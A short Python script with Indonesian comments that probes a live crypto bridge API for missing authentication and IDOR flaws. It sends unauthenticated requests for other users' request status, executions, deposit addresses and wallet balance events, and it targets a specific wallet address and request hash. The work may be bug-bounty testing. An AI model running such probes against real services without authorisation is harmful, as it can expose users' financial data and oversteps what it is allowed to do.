import json, urllib.request, urllib.error, time
BASE="https://api.relay.link"
U="0x48A7F32009473dE12582911CF0782e5268F2B9E4"
ETH="0x0000000000000000000000000000000000000000"
USDC="0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"
def post(p,b,t=30):
    d=json.dumps(b).encode()
    r=urllib.request.Request(BASE+p,data=d,headers={"content-type":"application/json","accept":"application/json"},method="POST")
    try:
        with urllib.request.urlopen(r,timeout=t) as x: return x.status,x.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()
    except Exception as e: return 0,f"ERR {e}"
def get(p,t=25):
    try:
        with urllib.request.urlopen(BASE+p,timeout=t) as x: return x.status,x.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()
    except Exception as e: return 0,f"ERR {e}"

# 1. intents/status tanpa auth - bisa baca status request ORANG?
print("### 1. /intents/status/v3 tanpa auth")
s,b=get("/intents/status/v3?requestId=0x1793666094e5345f3c05fe304f392d5d2b535625134a676efced0dd11c132393")
print(s,b[:400],"\n")

# 2. protocol/executions - IDOR?
print("### 2. /protocol/executions/{id}")
for rid in ["1","test","0x1793666094e5345f3c05fe304f392d5d2b535625134a676efced0dd11c132393"]:
    s,b=get(f"/protocol/executions/{rid}")
    print(f"  {rid[:20]:22} -> {s} {b[:200]}")

# 3. deposit-addresses - IDOR pada deposit address orang?
print("\n### 3. /deposit-addresses/v2 tanpa auth")
s,b=get("/deposit-addresses/v2")
print(s,b[:400],"\n")

# 4. balance/{wallet}/events tanpa auth
print("### 4. /balance/{wallet}/events")
s,b=get(f"/balance/{U}/events")
print(s,b[:500],"\n")

# 5. metrics/usage
print("### 5. /metrics/usage")
s,b=get("/metrics/usage")
print(s,b[:300])
